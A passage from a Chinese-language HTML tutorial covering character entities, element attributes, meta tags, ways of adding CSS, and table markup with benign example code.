&amp;pound;  | &#163;   |<br>| ¥        | 元（yen）         | &amp;yen;    | &#165;   |<br>| €        | 欧元（euro）      | &amp;euro;   | &#8364;  |<br>| ©        | 版权（copyright） | &amp;copy;   | &#169;   |<br>| ®        | 注册商标          | &amp;reg;    | &#174;   |</p><h2 id="13-属性"><a href="#13-属性" class="headerlink" title="13.属性"></a>13.属性</h2><p>属性是为 HTML 元素提供的附加信息。</p><ul><li>HTML 元素可以设置属性。</li><li>属性可以在元素中添加附加信息。</li><li>属性一般描述于开始标签。</li><li>属性总是以名称/值对的形式出现，比如：name=”value”。</li></ul><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://tothefor.com/&quot;</span>&gt;</span>这是一个链接使用了 href 属性<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="13-1适用于大多数HTML元素的属性"><a href="#13-1适用于大多数HTML元素的属性" class="headerlink" title="13.1适用于大多数HTML元素的属性"></a>13.1适用于大多数HTML元素的属性</h3><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">class</td><td align="center">为html元素定义一个或多个类名（classname）(类名从样式文件引入)</td></tr><tr><td align="center">id</td><td align="center">定义元素的唯一id</td></tr><tr><td align="center">style</td><td align="center">规定元素的行内样式（inline style）</td></tr><tr><td align="center">title</td><td align="center">描述了元素的额外信息 (作为工具条使用)</td></tr></tbody></table><h2 id="14-搜索引擎关键词（-lt-meta-gt-）"><a href="#14-搜索引擎关键词（-lt-meta-gt-）" class="headerlink" title="14.搜索引擎关键词（&lt;meta&gt;）"></a>14.搜索引擎关键词（&lt;meta&gt;）</h2><p>一些搜索引擎会利用 meta 元素的 name 和 content 属性来索引您的页面。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">//meta 元素定义页面的描述：<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;Free Web tutorials on HTML, CSS, XML&quot;</span> /&gt;</span><br>//meta 元素定义页面的关键词：<br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keywords&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;HTML, CSS, XML&quot;</span> /&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="15-样式（-lt-style-gt-）"><a href="#15-样式（-lt-style-gt-）" class="headerlink" title="15.样式（&lt;style&gt;）"></a>15.样式（&lt;style&gt;）</h2><p>&lt;style&gt; 标签定义了HTML文档的样式文件引用地址。在&lt;style&gt; 元素中你需要指定样式文件来渲染HTML文档：</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span>        <br><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:yellow&#125;        </span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue&#125;        </span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>        <br></code></pre></div></td></tr></table></figure><h2 id="16-加载脚本（-lt-script-gt-）"><a href="#16-加载脚本（-lt-script-gt-）" class="headerlink" title="16.加载脚本（&lt;script&gt;）"></a>16.加载脚本（&lt;script&gt;）</h2><p>&lt;script&gt; 标签用于加载脚本文件，如： JavaScript。</p><h2 id="17-使用CSS"><a href="#17-使用CSS" class="headerlink" title="17.使用CSS"></a>17.使用CSS</h2><p>CSS 可以通过以下方式添加到 HTML 中：</p><blockquote><ul><li>内联样式- 在 HTML 元素中使用 “style” 属性</li><li>内部样式表 -在 HTML 文档头部 &lt;head&gt;&gt; 区域使用 &lt;style&gt; 元素 来包含 CSS</li><li>外部引用 - 使用外部 CSS 文件</li></ul></blockquote><p>最好的方式是通过外部引用 CSS 文件。</p><h3 id="17-1-内联样式"><a href="#17-1-内联样式" class="headerlink" title="17.1 内联样式"></a>17.1 内联样式</h3><p>当特殊的样式需要应用到个别元素时，就可以使用内联样式，你可以在 &lt;head&gt; 部分通过 &lt;style&gt; 标签定义内部样式表。 使用内联样式的方法是在相关的标签中使用样式属性。样式属性可以包含任何 CSS 属性。</p><p>实例一：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--改变段落的颜色--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:yellow;&#125;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><p>实例二：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--背景颜色--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:yellow;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:red;&quot;</span>&gt;</span>This is a heading<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background-color:green;&quot;</span>&gt;</span>This is a paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>实例三：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--字体颜色 ，字体大小--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:verdana;&quot;</span>&gt;</span>A heading<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:arial;color:red;font-size:20px;&quot;</span>&gt;</span>A paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>现在通常使用 font-family（字体），color（颜色），和 font-size（字体大小）属性来定义文本样式，而不是使用 &lt;font&gt; 标签。</p><h3 id="17-2-内部样式表"><a href="#17-2-内部样式表" class="headerlink" title="17.2 内部样式表"></a>17.2 内部样式表</h3><p>当单个文件需要特别样式时，就可以使用内部样式表。可以在 &lt;head&gt; 部分通过 &lt;style&gt; 标签定义内部样式表：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background-color</span>:yellow;&#125;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h3 id="17-3外部引用"><a href="#17-3外部引用" class="headerlink" title="17.3外部引用"></a>17.3外部引用</h3><p>当样式需要被应用到很多页面的时候，外部样式表将是理想的选择。使用外部样式表，你就可以通过更改一个文件来改变整个站点（或全部页面）的外观。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mystyle.css&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--href地址为外部样式链接的地址--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h2 id="18-表格（-lt-table-gt-）"><a href="#18-表格（-lt-table-gt-）" class="headerlink" title="18.表格（&lt;table&gt;）"></a>18.表格（&lt;table&gt;）</h2><p>表格由&lt;table&gt;标签来定义。每个表格均有若干行（由&lt;tr&gt;标签定义），每行被分割为若干单元格（由&lt;td&gt;标签定义）。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。<br><strong>表格的基本结构：</strong></p><blockquote><ul><li>&lt;table&gt;…&lt;/table&gt;：定义表格</li><li>&lt;th&gt;…&lt;/th&gt;：定义表格的标题栏（文字会自动加粗）</li><li>&lt;tr&gt;…&lt;/tr&gt;：定义表格的行</li><li>&lt;td&gt;…&lt;/td&gt;：定义表格的列</li></ul></blockquote><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>效果如下：<br>| row 1, cell 1 | row 1, cell 2 |<br>| :-:| :-:|<br>| row 2, cell 1 | row 2, cell 2 |</p><h3 id="18-1相关属性"><a href="#18-1相关属性" class="headerlink" title="18.1相关属性"></a>18.1相关属性</h3><h4 id="18-1-1边框（border）"><a href="#18-1-1边框（border）" class="headerlink" title="18.1.1边框（border）"></a>18.1.1边框（border）</h4><p>如果不定义边框属性，表格将不显示边框。如果我们希望显示边框，使用边框属性border来显示一个带有边框的表格。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-2表头单元格（-lt-th-gt-）"><a href="#18-1-2表头单元格（-lt-th-gt-）" class="headerlink" title="18.1.2表头单元格（&lt;th&gt;）"></a>18.1.2表头单元格（&lt;th&gt;）</h4><p>表格的表头单元格使用&lt;th&gt;标签进行定义。表格的表头单元格属性主要是一些公共属性，如：align、dir、width、height。大多数浏览器会把表头显示为粗体居中的文本。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Header 1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Header 2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-3表格标题（-lt-caption-gt-）"><a href="#18-1-3表格标题（-lt-caption-gt-）" class="headerlink" title="18.1.3表格标题（&lt;caption&gt;）"></a>18.1.3表格标题（&lt;caption&gt;）</h4><p>　在&lt;table&gt;标签中我们可以使用&lt;caption&gt; … &lt;/ caption&gt;标签作为标题，并在表的顶部显示出来。<br>　<strong>但需要注意的是：此标签在较新版本的HTML / XHTML中已弃用</strong></p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">caption</span>&gt;</span>这是标题<span class="hljs-tag">&lt;/<span class="hljs-name">caption</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 1, columnn 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>         <br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>row 2, columnn 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-4表格高度和宽度"><a href="#18-1-4表格高度和宽度" class="headerlink" title="18.1.4表格高度和宽度"></a>18.1.4表格高度和宽度</h4><p>在&lt;table&gt;标签中您可以使用width（宽）和height（高）属性设置表格宽度和高度。也可以按像素或可用屏幕区域的百分比来指定表格宽度或高度。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">width</span> = <span class="hljs-string">&quot;400&quot;</span> <span class="hljs-attr">height</span> = <span class="hljs-string">&quot;150&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1, Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2, Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2, Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-5表格背景"><a href="#18-1-5表格背景" class="headerlink" title="18.1.5表格背景"></a>18.1.5表格背景</h4><p>可以使用以下方法之一设置 HTML 表格的背景 ：</p><blockquote><ul><li>bgcolor属性 ： 可以为整个表格或仅为一个单元格设置背景颜色。</li><li>background属性 ：可以为整个表设置背景图像或仅为一个单元设置背景图像。</li><li>bordercolor属性 ：可以设置边框颜色。</li></ul></blockquote><p><strong>注意的是：HTML5 中不推荐使用bgcolor，background和bordercolor属性。</strong></p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">bordercolor</span> = <span class="hljs-string">&quot;green&quot;</span> <span class="hljs-attr">background</span> = <span class="hljs-string">&quot;test.png&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 3<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-6表格间距"><a href="#18-1-6表格间距" class="headerlink" title="18.1.6表格间距"></a>18.1.6表格间距</h4><p>以下两个属性，用于调整 HTML 表格中单元格的空间：</p><blockquote><ul><li>cellspacing属性：定义表格单元格之间的空间 </li><li>cellpadding属性：表示单元格边框与单元格内容之间的距离</li></ul></blockquote><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">cellpadding</span> = <span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">cellspacing</span> = <span class="hljs-string">&quot;5&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Salary<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>其琛<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>5000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>曼迪<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>7000<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-7合并单元格"><a href="#18-1-7合并单元格" class="headerlink" title="18.1.7合并单元格"></a>18.1.7合并单元格</h4><p>可以将多行（或列）进行合并成一行。</p><blockquote><ul><li>如果要将两个或多个列合并为一个列，将使用colspan属性 。</li><li>如果要合并两行或更多行，则将使用rowspan属性。</li></ul></blockquote><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 1<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 2<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Column 3<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">rowspan</span> = <span class="hljs-string">&quot;2&quot;</span>&gt;</span>Row 1 Cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1 Cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 1 Cell 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2 Cell 2<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>Row 2 Cell 3<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;3&quot;</span>&gt;</span>Row 3 Cell 1<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="18-1-8表格的头部、主体、页脚"><a href="#18-1-8表格的头部、主体、页脚" class="headerlink" title="18.1.8表格的头部、主体、页脚"></a>18.1.8表格的头部、主体、页脚</h4><p>表格可以分为三个部分 - 头部，主体和页脚，如同word 